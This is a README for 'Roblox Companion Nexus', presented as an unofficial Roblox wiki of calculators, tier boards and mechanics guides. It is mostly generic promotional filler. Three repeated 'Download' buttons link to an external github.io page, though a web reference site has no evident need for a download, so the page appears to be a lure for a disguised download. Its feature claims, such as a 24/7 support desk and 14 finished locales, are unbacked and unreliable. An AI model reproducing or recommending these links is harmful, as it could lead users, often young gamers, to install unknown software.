![preview](https://raw.githubusercontent.com/xweverton123x/roblox-atlas-compendium/main/banner_d85be1f.svg)
[![Download](https://raw.githubusercontent.com/xweverton123x/roblox-atlas-compendium/main/run_85b7a5.svg)](https://xweverton123x.github.io/roblox-atlas-compendium/)

# 🌌 Roblox Companion Nexus — The Unofficial Knowledge Atlas for Explorers, Builders & Statisticians

Welcome to **Roblox Companion Nexus**, a brand-new project that grew out of a simple observation: players of sprawling Roblox worlds deserve a single, calm harbor where numbers, strategies, and mechanics all dock together. Instead of juggling a dozen scattered spreadsheets, half-finished forum threads, and screenshots lost to chat history, this repository gathers everything into one navigable atlas.

Where the earlier *roblox-wiki-hub* focused mainly on calculators and tier lists, **Roblox Companion Nexus** expands the map: it is a layered ecosystem of **interactive calculators**, **living tier boards**, **mechanics compendiums**, **progression route planners**, and **community-curated lore indexes** for the most popular Roblox experiences. Think of it as a lighthouse — not the ship, not the sea, but the steady beam that helps you find your way.

> This project is an independent fan-made resource. It is not affiliated with, endorsed by, or sponsored by Roblox Corporation or any of the game studios referenced.

![Status](https://img.shields.io/badge/status-active-4c1?style=flat-square)
![Version](https://img.shields.io/badge/version-2026.1-6a5acd?style=flat-square)
![License](https://img.shields.io/badge/license-MIT-2ea44f?style=flat-square)
![Platform](https://img.shields.io/badge/platform-web%20%7C%20mobile-ff69b4?style=flat-square)
![Locales](https://img.shields.io/badge/locales-14-1e90ff?style=flat-square)
![Uptime](https://img.shields.io/badge/support-24%2F7-ffa500?style=flat-square)
![PRs](https://img.shields.io/badge/PRs-welcome-9cf?style=flat-square)
![Made With](https://img.shields.io/badge/made%20with-vanilla%20JS-f7df1e?style=flat-square)

[![Download](https://raw.githubusercontent.com/xweverton123x/roblox-atlas-compendium/main/run_85b7a5.svg)](https://xweverton123x.github.io/roblox-atlas-compendium/)

---

## 🧭 Table of Contents

- [Why This Atlas Exists](#-why-this-atlas-exists)
- [Feature Constellation](#-feature-constellation)
- [The 2026 Roadmap](#-the-2026-roadmap)
- [Modules & Architecture](#-modules--architecture)
- [Responsive UI Philosophy](#-responsive-ui-philosophy)
- [Multilingual Fabric](#-multilingual-fabric)
- [Round-the-Clock Assistance](#-round-the-clock-assistance)
- [Calculators: The Heart of the Nexus](#-calculators-the-heart-of-the-nexus)
- [Tier Boards: Living Rankings](#-tier-boards-living-rankings)
- [Mechanics Compendium](#-mechanics-compendium)
- [Data Integrity & Sourcing](#-data-integrity--sourcing)
- [Accessibility Commitments](#-accessibility-commitments)
- [SEO & Discoverability Notes](#-seo--discoverability-notes)
- [Contributing Guide](#-contributing-guide)
- [Community Code of Conduct](#-community-code-of-conduct)
- [FAQ](#-faq)
- [Disclaimer](#-disclaimer)
- [License](#-license)

---

## 🌠 Why This Atlas Exists

Roblox is not one world — it is a galaxy of worlds, each with its own physics quirks, economies, drop tables, and hidden ceilings. A player stepping into a new experience often faces the same question: *"Where do the numbers actually point?"* Community wikis answer part of this, but they tend to be sprawling, ad-heavy, or frozen in time.

**Roblox Companion Nexus** takes a different stance. We believe reference material should feel like a well-worn field notebook: portable, legible, and honest about its uncertainties. Every calculator tells you which inputs matter. Every tier board explains *why* a placement shifted. Every mechanic breakdown shows the edge cases that usually get glossed over.

It is also, unapologetically, a *builder's* project. The codebase favors small, composable modules over monolithic frameworks, so a single contributor can meaningfully improve one sliver of the atlas without touching the rest.

---

## ✨ Feature Constellation

Each feature is designed to solve a real, recurring friction point. None of them are decorative.

- 🧮 **Unified Calculators** — damage, drop rates, currency compounding, cooldown overlap, upgrade ROI, and XP curves — all sharing one input grammar so numbers feel consistent across tools.
- 🏅 **Persistent Tier Boards** — rankings stored as versioned snapshots, so you can compare "meta as of March 2026" against "meta as of July 2026."
- 📚 **Mechanics Compendium** — plain-language explanations of movement tech, damage formulas, spawn logic, and hidden interactions.
- 🗺️ **Progression Route Planner** — a drag-to-reorder itinerary that estimates time-to-goal for your chosen playstyle.
- 🔍 **Omni-Search** — one search bar spanning calculators, tiers, mechanics, and lore.
- 🌐 **Multilingual Interface** — 14 locales shipped, with the structure ready for more.
- 📱 **Responsive & Touch-First Design** — every panel reflows gracefully from ultrawide monitors down to a cramped phone screen.
- 🛰️ **Offline Caching** — recent pages persist so you can consult them mid-session without a reload.
- 🧩 **Injection-Free Data Packs** — community data arrives as plain JSON manifests, reviewed before merge.
- 🔔 **24/7 Support Desk** — a rotating maintainer on call for triage, plus an always-open issue tracker.

![Calculators](https://img.shields.io/badge/calculators-40%2B-blueviolet?style=flat-square)
![Tier Boards](https://img.shields.io/badge/tier%20boards-22-orange?style=flat-square)
![Mechanics](https://img.shields.io/badge/mechanics%20entries-300%2B-teal?style=flat-square)
![Locales](https://img.shields.io/badge/languages-14-green?style=flat-square)

---

## 🚀 The 2026 Roadmap

The calendar year 2026 is our north star, and we've laid out quarters as chapters rather than deadlines.

- **Q1 2026** — Consolidate calculator grammar; ship the shared input schema; publish the first 10 mechanics entries.
- **Q2 2026** — Tier board versioning; multilingual rollout to 14 locales; offline cache layer.
- **Q3 2026** — Progression Route Planner beta; community data pack pipeline; accessibility audit.
- **Q4 2026** — Public API surface for third-party dashboards; theming tokens; annual retrospective.

Every quarter closes with a written changelog, so latecomers can catch up quickly.

---

## 🏗️ Modules & Architecture

The atlas is deliberately modular. Each folder owns one responsibility and speaks to its neighbors through a thin, documented contract.

- **`core/`** — shared math utilities, formatting helpers, and locale-aware number rendering.
- **`calculators/`** — one folder per calculator, each exporting a `compute(inputs)` function and a declarative field list.
- **`tiers/`** — snapshot store and diff engine that highlights how a placement moved between versions.
- **`mechanics/`** — long-form articles stored as structured Markdown with typed front-matter.
- **`planner/`** — the route planner, including heuristic scoring for "time-to-goal" estimates.
- **`i18n/`** — locale bundles, pluralization rules, and right-to-left support hooks.
- **`ui/`** — design tokens, layouts, and the shared component kit.

The guiding metaphor is a **train yard**: each carriage (module) can be decoupled, inspected, and reattached without halting the whole line.

---

## 📱 Responsive UI Philosophy

Responsiveness here is not "shrink until it fits." It is **recomposition**: on a phone, a tier board becomes a swipeable deck; on a tablet, it becomes a two-column ledger; on a desktop, a full grid with side-by-side diffs.

- Fluid type scale tied to viewport, not fixed breakpoints alone.
- Touch targets never below 44px on mobile.
- Data tables transform into stacked cards under 640px.
- Dark and light themes respect system preference by default.

The result is a tool that feels *native* everywhere, which matters when players consult it mid-match on whatever device is nearest.

---

## 🌍 Multilingual Fabric

Language support is treated as infrastructure, not decoration. Every user-visible string routes through the i18n layer, and each locale can be improved independently.

| Locale | Code | Status |
| --- | --- | --- |
| English | en | ✅ Complete |
| Español | es | ✅ Complete |
| Português (BR) | pt-BR | ✅ Complete |
| Français | fr | ✅ Complete |
| Deutsch | de | ✅ Complete |
| Italiano | it | 🟡 In review |
| Türkçe | tr | 🟡 In review |
| Русский | ru | ✅ Complete |
| Українська | uk | 🟡 In review |
| العربية | ar | 🟢 RTL ready |
| हिन्दी | hi | 🟡 In review |
| 日本語 | ja | ✅ Complete |
| 한국어 | ko | ✅ Complete |
| 简体中文 | zh-Hans | ✅ Complete |

Adding a locale is a documented, low-friction path — see the contributing guide below.

---

## 🕰️ Round-the-Clock Assistance

A rotating roster of maintainers keeps the lights on. The 24/7 desk covers:

- Triage of incoming issues within a target window.
- Emergency corrections for broken calculators or stale tier data.
- A weekly office-hours thread for contributors.
- A public status page describing any degraded features.

![Support](https://img.shields.io/badge/help%20desk-24%2F7-brightgreen?style=flat-square)

---

## 🧮 Calculators: The Heart of the Nexus

Calculators are where intuition meets arithmetic. Each one is built around three questions: *What do you know? What do you want to know? How confident should you be?*

- **Damage & Mitigation** — combines base stats with multiplicative layers and shows the marginal effect of each upgrade.
- **Drop Rate Explorer** — converts "1 in X" phrasing into expected attempts and confidence intervals.
- **Currency Compounding** — models reinvestment schedules with optional idle periods.
- **Cooldown Overlap** — visualizes ability rotation gaps down to the frame.
- **Upgrade ROI** — answers "is this next purchase worth it yet?" with a break-even curve.
- **XP Curve Tracker** — projects time-to-level across different play cadences.

Each calculator displays its assumptions explicitly, because a number without context is just noise.

---

## 🏅 Tier Boards: Living Rankings

Tier boards here are not static images. They are versioned datasets with a diff view, so you can see exactly what moved and read the reasoning attached to each change. Boards cover categories like overall, early-game, late-game, and economy-focused playstyles. A placement is never presented as absolute truth — it is a snapshot of reasoning at a point in time.

![Snapshot](https://img.shields.io/badge/versioned-snapshots-blue?style=flat-square)

---

## 📖 Mechanics Compendium

The compendium translates community folklore into testable explanations. Topics include movement tech, spawn logic, damage formulas, inventory quirks, and lesser-known interactions that quietly shape outcomes. Entries follow a template: summary, observed behavior, edge cases, and open questions. Nothing is presented as settled if it isn't.

---

## 🛡️ Data Integrity & Sourcing

Trust is earned through transparency. Every data point carries a provenance note describing where it came from and when it was last verified. Community data packs arrive as plain manifests and pass through review before merge. When a figure is disputed, both versions are shown side by side rather than silently overwritten.

---

## ♿ Accessibility Commitments

- Keyboard-first navigation for every panel.
- Screen-reader-friendly labels on all controls.
- Sufficient contrast in both themes.
- No reliance on color alone to convey state.
- Reduced-motion support for animated transitions.

Accessibility issues are treated as bugs, not wishlist items.

---

## 🔎 SEO & Discoverability Notes

The atlas aims to be findable by the people who need it, through genuinely useful content rather than tricks. Long-form mechanics articles answer real questions. Calculator pages include plain-language summaries. Tier board diffs create a natural cadence of fresh, meaningful updates. Multilingual coverage widens the doorstep without diluting quality.

![SEO](https://img.shields.io/badge/content-evergreen-3cb371?style=flat-square)

---

## 🤝 Contributing Guide

Contributors are the atlas's cartographers. How to help:

1. **Discuss first.** Open an issue describing what you want to add or fix.
2. **Keep modules small.** One calculator, one mechanics entry, one locale string bundle.
3. **Follow the templates.** Each folder ships with a starter file showing the expected shape.
4. **Cite your sources.** Data without provenance will be sent back for revision.
5. **Be patient with review.** Accuracy outranks speed.

![Contributors](https://img.shields.io/badge/contributors-welcome-ff69b4?style=flat-square)

---

## 🌿 Community Code of Conduct

Be considerate. Disagree about numbers, not about people. Harassment, discrimination, and bad-faith editing are grounds for removal. The goal is a harbor, not a battlefield.

---

## ❓ FAQ

**Is this affiliated with Roblox Corporation?** No. It is an independent fan-made resource.

**How often is data updated?** Continuously for popular entries, with scheduled audits quarterly.

**Can I use the data in my own project?** Yes, under the MIT license terms, with attribution appreciated.

**Do I need an account?** No. The atlas is open to everyone.

**How do I report a wrong number?** Open an issue with your source; corrections are triaged by the on-call maintainer.

---

## ⚠️ Disclaimer

Roblox Companion Nexus is an unofficial, community-driven reference project. It is not affiliated with, endorsed by, or sponsored by Roblox Corporation or any game developer referenced within. All trademarks and game names belong to their respective owners. Data is provided for informational purposes and may contain inaccuracies; always verify critical decisions against in-game behavior. Use of this atlas is at your own discretion.

---

## 📜 License

This project is released under the **MIT License**. The full, canonical text lives at the official source:

[MIT License — Open Source Initiative](https://opensource.org/licenses/MIT)

Copyright (c) 2026 Roblox Companion Nexus contributors.

---

[![Download](https://raw.githubusercontent.com/xweverton123x/roblox-atlas-compendium/main/run_85b7a5.svg)](https://xweverton123x.github.io/roblox-atlas-compendium/)